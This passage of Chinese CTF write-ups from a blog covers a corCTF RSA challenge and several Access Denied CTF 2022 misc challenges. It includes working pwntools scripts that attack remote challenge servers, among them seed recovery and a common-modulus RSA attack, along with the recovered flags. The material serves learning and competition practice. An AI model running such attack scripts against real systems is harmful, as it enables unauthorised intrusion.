class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag.txt&#x27;</span>).read().encode()<br><br>random.seed(<span class="hljs-built_in">int</span>(time.time()))<br></code></pre></td></tr></table></figure><p>脚本中使用了时间作为随机数生成的seed。所以我们第一步就可以获得这个seed。方法很简单，我们能够得到对应明文的密文，那么我们只需要输入一个seed然后这个seed输出的e作为加密参数加密出来的结果和服务器提供的一致即可。所以在我们连接服务器之前，以本地时间得到seed即可得到一个开始值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># sh -&gt; pwn.remote</span><br>sh.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>sh.sendline(<span class="hljs-string">b&quot;41&quot;</span>) <span class="hljs-comment"># &quot;A“</span><br>sh.recvuntil(<span class="hljs-string">b&quot;Here is your encrypted message: &quot;</span>)<br>cipher = sh.recvline().strip().decode()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    random.seed(seed)<br>    <span class="hljs-keyword">if</span> encrypt(binascii.unhexlify(<span class="hljs-string">b&quot;41&quot;</span>)) == cipher: <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span> : seed += <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;seed = <span class="hljs-subst">&#123;seed&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里有一个问题就是，这个encrypt函数需要使用phi。但是我们的本地是没有的。所以需要队encrypt函数稍做修改。我们知道phi一定一个偶数，因为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>h</mi><mi>i</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">phi = (p-1)*(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>而p和q都是素数也就是(p-1)和(q-1)都是偶数。</p><p>那么e要和phi互素就要求e要是奇数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg</span>):<br>    e = random.randint(<span class="hljs-number">1</span>, n)<br>    <span class="hljs-keyword">while</span> e % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> :   <span class="hljs-comment"># an odd and an even number likely co-prime</span><br>        e = random.randint(<span class="hljs-number">1</span>, n)<br>    pt = bytes_to_long(msg)<br>    ct = <span class="hljs-built_in">pow</span>(pt, e, n)<br>    <span class="hljs-keyword">return</span> binascii.hexlify(long_to_bytes(ct)).decode()<br></code></pre></td></tr></table></figure><p>当然这样改是有点问题的，但是可以通过多次的尝试来解决。如果一段时间没有出结果，我们需要重启攻击脚本。</p><p>得到seed之后，也就相当于e我们得到了。n是无法分解的，这里我们能够得到flag的不同e的加密输出。所以这里可以选择使用共模攻击。</p><p>但是共模攻击有一个要求，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(e_1,e_2) = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>也就是要求我们前后两次的加密指数e要是互质的。</p><p>由于服务器对我们请求的加密的次数没有限制所以我们可以很轻松的找到一组满足要求的密文和加密指数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert, gcd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg</span>):<br>    e = random.randint(<span class="hljs-number">1</span>, n)<br>    <span class="hljs-keyword">while</span> e % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> :   <span class="hljs-comment"># an odd and an even number likely co-prime</span><br>        e = random.randint(<span class="hljs-number">1</span>, n)<br>    pt = bytes_to_long(msg)<br>    ct = <span class="hljs-built_in">pow</span>(pt, e, n)<br>    <span class="hljs-keyword">return</span> binascii.hexlify(long_to_bytes(ct)).decode()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CMA</span>(<span class="hljs-params">n, c1, c2, e1, e2</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a, b</span>):<br>        <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> a, <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            x, y = egcd(b, a % b)<br>            <span class="hljs-keyword">return</span> y, x - (a // b) * y<br>    s = egcd(e1, e2)<br>    s1 = s[<span class="hljs-number">0</span>]<br>    s2 = s[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">if</span> s1 &lt; <span class="hljs-number">0</span>:<br>        s1 = - s1<br>        c1 = invert(c1, n)<br>    <span class="hljs-keyword">elif</span> s2 &lt; <span class="hljs-number">0</span>:<br>        s2 = - s2<br>        c2 = invert(c2, n)<br>    m = <span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n) % n<br>    <span class="hljs-keyword">return</span> m<br><br>seed = <span class="hljs-built_in">int</span>(time.time())<br>sh = remote(<span class="hljs-string">&quot;be.ax&quot;</span>, <span class="hljs-number">31124</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&quot;Your modulus is: &quot;</span>)<br>n = <span class="hljs-built_in">int</span>(sh.recvline().strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># if you run many seconds and the seed wasnt printed, you need retry this script</span><br>sh.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>sh.sendline(<span class="hljs-string">b&quot;41&quot;</span>) <span class="hljs-comment"># &quot;A“</span><br>sh.recvuntil(<span class="hljs-string">b&quot;Here is your encrypted message: &quot;</span>)<br>cipher = sh.recvline().strip().decode()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    random.seed(seed)<br>    <span class="hljs-keyword">if</span> encrypt(binascii.unhexlify(<span class="hljs-string">b&quot;41&quot;</span>)) == cipher: <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span> : seed += <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;seed = <span class="hljs-subst">&#123;seed&#125;</span>&quot;</span>)<br><br>sh.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">b&quot;Here is your encrypted flag: &quot;</span>)<br>flag1 = <span class="hljs-built_in">int</span>(<span class="hljs-string">b&quot;0x&quot;</span> + sh.recvline().strip(), <span class="hljs-number">16</span>)<br>e1 = random.randint(<span class="hljs-number">1</span>, n)<br><span class="hljs-keyword">while</span> e1 % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>    e1 = random.randint(<span class="hljs-number">1</span>, n)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sh.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Here is your encrypted flag: &quot;</span>)<br>    flag2 = <span class="hljs-built_in">int</span>(<span class="hljs-string">b&quot;0x&quot;</span> + sh.recvline().strip(), <span class="hljs-number">16</span>)<br>    e2 = random.randint(<span class="hljs-number">1</span>, n)<br>    <span class="hljs-keyword">while</span> e2 % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        e2 = random.randint(<span class="hljs-number">1</span>, n)<br><br>    <span class="hljs-keyword">if</span> gcd(e1, e2) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br><br>m = CMA(n, flag1, flag2, e1, e2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><br><span class="hljs-comment"># b&#x27;corctf&#123;y34h_th4t_w4snt_v3ry_h1dd3n_tbh_l0l&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Access Denied CTF 2022</title>
    <link href="/2022/06/12/Access-Denied-CTF-2022/"/>
    <url>/2022/06/12/Access-Denied-CTF-2022/</url>
    
    <content type="html"><![CDATA[<p>Access Denied CTF 2022</p><span id="more"></span><p>难度不算太大。这次和我朋友努力一把冲前20希望能成功。第一次能把MISC ak。</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><p>没有隐写的misc，写着真舒服。</p><h2 id="shark-1"><a class="markdownIt-Anchor" href="#shark-1"></a> <strong>Shark-1</strong></h2><p>Description：</p><figure class="highlight applescript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs applescript">Nobody likes traffic, <span class="hljs-keyword">but</span> what <span class="hljs-keyword">about</span> network traffic?<br></code></pre></td></tr></table></figure><p>附件是pcapng。</p><p>在tcp流0中有信息。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">give <span class="hljs-keyword">me</span> the <span class="hljs-built_in">xor</span> <span class="hljs-keyword">key</span><br><span class="hljs-built_in">xor</span> <span class="hljs-keyword">key</span> <span class="hljs-number">80</span><br>Here <span class="hljs-built_in">is</span> the flag: <span class="hljs-number">4</span>ePj5fPz5OXu6eXk+/ex8rPz6LTy69/<span class="hljs-built_in">is</span>/P03+aw8t/wtOPrs/Tf8+<span class="hljs-number">6</span>x5uax7uffuebjs7i0seKx/Q==<br>Thank you got it<br></code></pre></td></tr></table></figure><p>base64解码然后异或一下就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>data = b64decode(<span class="hljs-string">&quot;4ePj5fPz5OXu6eXk+/ex8rPz6LTy69/is/P03+aw8t/wtOPrs/Tf8+6x5uax7uffuebjs7i0seKx/Q==&quot;</span>)<br>key = <span class="hljs-number">0x80</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^key), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment"># accessdenied&#123;w1r3sh4rk_b3st_f0r_p4ck3t_sn1ff1ng_9fc3841b1&#125;</span><br></code></pre></td></tr></table></figure><h2 id="flow"><a class="markdownIt-Anchor" href="#flow"></a> <strong>Flow</strong></h2><p>Description：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Kill</span> the dragon.<br><span class="hljs-attribute">server</span>: nc <span class="hljs-number">35.193.60.121</span> <span class="hljs-number">9337</span><br></code></pre></td></tr></table></figure><p>这题挺奇怪的，随便试试就出来了。一开始以为要整数溢出，结果不需要。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\lanpesk&gt;nc 35.193.60.121 9337<br>1.) Fight the dragon<br>2.) Enter the shop<br>3.) See your current level<br>4.) exit<br>2<br>There are 5 levels of sword available<br>1.) Level 1 sword each costs 500. It helps you level up by 1<br>2.) Level 2 sword each costs 5000. It helps you level up by 10<br>3.) Level 3 sword each costs 50000. It helps you level up by 100<br>4.) Level 4 sword each costs 500000. It helps you level up by 1000<br>5.) Level 5 sword each costs 5000000. It helps you level up by 10000<br>Which sword you want? 5<br>Enter the number of swords you want to buy? 12321<br>You have success increased your level to 123210001<br>1.) Fight the dragon<br>2.) Enter the shop<br>3.) See your current level<br>4.) exit<br>1<br>The dragon is currently on level 5000000.<br>Hoooo........ You killed the dragon<br>Here is your flag accessdenied&#123;1nt3g3r_0v3rfl0w5_4r3_d4ng3r0u5_2d7b9a76&#125;<br></code></pre></td></tr></table></figure><h2 id="shark-2"><a class="markdownIt-Anchor" href="#shark-2"></a> <strong>Shark-2</strong></h2><p>Description：</p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mercury">I guess you know what wireshark <span class="hljs-keyword">is</span>.<br></code></pre></td></tr></table></figure><p>在tcp流42中有一张图片。</p><p>导出来打开即可的flag。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># accessdenied&#123;3xtr4ct_0bj3ct5_fr0m_w1r3sh4rk&#125;</span><br></code></pre></td></tr></table></figure><h2 id="bobs-favourite-number"><a class="markdownIt-Anchor" href="#bobs-favourite-number"></a> <strong>Bobs Favourite Number</strong></h2><p>Description：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Can</span> you find identify bob&#x27;s favourite numbers?<br><span class="hljs-attribute">server</span>: nc <span class="hljs-number">35.193.60.121</span> <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure><p>附件是题目的描述。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Bobs favourite numbers<br><br>Bob likes two numbers <span class="hljs-number">1856</span> (<span class="hljs-keyword">as</span> his college was founded <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> Civil Engineering College <span class="hljs-keyword">on</span> <span class="hljs-number">24</span> November <span class="hljs-number">1856</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">2014</span> (<span class="hljs-keyword">as</span> his college was renamed <span class="hljs-keyword">as</span> Indian Institute <span class="hljs-keyword">of</span> Engineering Science <span class="hljs-keyword">and</span> Technology, Shibpur <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> Govt. <span class="hljs-keyword">of</span> India <span class="hljs-keyword">in</span> March <span class="hljs-number">2014</span>).<br><br>A <span class="hljs-built_in">number</span> N <span class="hljs-keyword">is</span> Bob&#x27;s favourite <span class="hljs-built_in">number</span> <span class="hljs-keyword">if</span> N <span class="hljs-keyword">is</span> <span class="hljs-keyword">equal</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> sum <span class="hljs-keyword">of</span> a certain <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1856</span> <span class="hljs-keyword">and</span> sum <span class="hljs-keyword">of</span> a certain <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-number">2014.</span><br><br>Task: Print whether a <span class="hljs-built_in">number</span> <span class="hljs-keyword">is</span> Bob&#x27;s favourite <span class="hljs-built_in">number</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span>.<br><br>Input: <br>First line <span class="hljs-keyword">contains</span> a single <span class="hljs-built_in">integer</span> <span class="hljs-built_in">number</span> N.<br><br>Output:<br>Print “Yes” <span class="hljs-keyword">if</span> Favourite <span class="hljs-keyword">if</span> N <span class="hljs-keyword">is</span> Bob’s favourite <span class="hljs-built_in">number</span>, <span class="hljs-keyword">else</span> print “No”.<br><br>Constraints: <span class="hljs-number">1</span> &lt;= N &lt;= <span class="hljs-number">10</span>^<span class="hljs-number">9</span><br><br>Sample input:<br><span class="hljs-number">5726</span><br><br>Sample output:<br>Yes<br><br>Sample explanation:<br><span class="hljs-number">5726</span> can be represented <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> sum <span class="hljs-keyword">of</span> <span class="hljs-number">1856</span> + <span class="hljs-number">1856</span> + <span class="hljs-number">2014.</span><br></code></pre></td></tr></table></figure><p>判断给出的数是否是由1856和2014组成的。</p><p>跑脚本就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote ( <span class="hljs-string">&quot;35.193.60.121&quot;</span>, <span class="hljs-number">1337</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    num = <span class="hljs-built_in">eval</span>(r.recvline())<br>    r.recvline()<br><br>    c = num<br>    a = <span class="hljs-number">1856</span><br>    b = <span class="hljs-number">2014</span><br><br>    <span class="hljs-comment"># 懒得写数论，多跑几次就能出， 网上找的二元一次不定方程的解判定不太行。干脆直接暴力了。</span><br>    find = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c // a + <span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):  <span class="hljs-comment"># 穷举可能的x</span><br>            <span class="hljs-keyword">if</span> find:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((c - a * x) // b + <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):  <span class="hljs-comment"># 穷举可能的y</span><br>                <span class="hljs-keyword">if</span> a * x + b * y == c:<br>                    find = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> find:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Yes&quot;</span>)<br>        r.send(<span class="hljs-string">b&quot;Yes\n&quot;</span>)<br>        find = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No&quot;</span>)<br>        r.send(<span class="hljs-string">b&quot;No\n&quot;</span>)<br><br>    flag = r.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;access&quot;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br><br>r.closed()<br><br><span class="hljs-comment"># accessdenied&#123;b0bs_f4v0r1t3_numb3r5_4r3_m1n3_f4v0urit3_t00_61c884c8&#125;</span><br></code></pre></td></tr></table></figure><h2 id="green-and-red-flags"><a class="markdownIt-Anchor" href="#green-and-red-flags"></a> <strong>Green and Red flags</strong></h2><p>Description：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Find</span> the greatest number possible.<br><span class="hljs-attribute">server</span>: server: nc <span class="hljs-number">35.193.60.121</span> <span class="hljs-number">5337</span><br></code></pre></td></tr></table></figure><p>附件是题目描述。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Green <span class="hljs-keyword">and</span> Red Flag<br><br>Given <span class="hljs-keyword">a</span> <span class="hljs-built_in">number</span> N <span class="hljs-keyword">and</span> <span class="hljs-keyword">each</span> <span class="hljs-built_in">number</span> is assigned either <span class="hljs-keyword">a</span> green <span class="hljs-keyword">or</span> red flag. We can apply <span class="hljs-keyword">the</span> following operations <span class="hljs-keyword">any</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> times: choose <span class="hljs-keyword">any</span> <span class="hljs-literal">two</span> digits <span class="hljs-keyword">of</span> <span class="hljs-built_in">number</span> N <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> same coloured flag assigned <span class="hljs-keyword">and</span> swap them.<br><br>Task: Print <span class="hljs-keyword">the</span> maximum possible <span class="hljs-built_in">number</span>, <span class="hljs-keyword">after</span> applying <span class="hljs-keyword">any</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> operations <span class="hljs-keyword">on</span> <span class="hljs-title">number</span> <span class="hljs-title">N</span>.<br><br>Input: <br>First <span class="hljs-built_in">line</span> <span class="hljs-keyword">contains</span> D <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> digits <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> N.<br>Second <span class="hljs-built_in">line</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> N which indicates <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> N.<br>Third <span class="hljs-built_in">line</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> C which indicates <span class="hljs-keyword">the</span> colour <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> flag assigned <span class="hljs-built_in">to</span> <span class="hljs-keyword">each</span> digit.<br><br>Output:<br>Print <span class="hljs-keyword">the</span> maximum possible <span class="hljs-built_in">number</span>, <span class="hljs-keyword">after</span> applying <span class="hljs-keyword">any</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> operations <span class="hljs-keyword">on</span> <span class="hljs-title">number</span> <span class="hljs-title">N</span>.<br><br>Constraints: <span class="hljs-number">1</span> &lt;= D &lt;= <span class="hljs-number">10</span>^<span class="hljs-number">6</span><br><br>Sample input<br><span class="hljs-number">5</span><br><span class="hljs-number">16487</span><br>rgrrg<br><br>Sample output<br><span class="hljs-number">87416</span> <br></code></pre></td></tr></table></figure><p>就是r的数字可以互相换位置，g的位置可以互相换位置。那么我们只要rg的序列都是最大的就可以了。这题的数据量十分大，所以我找了在国外的同学来帮我跑这个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 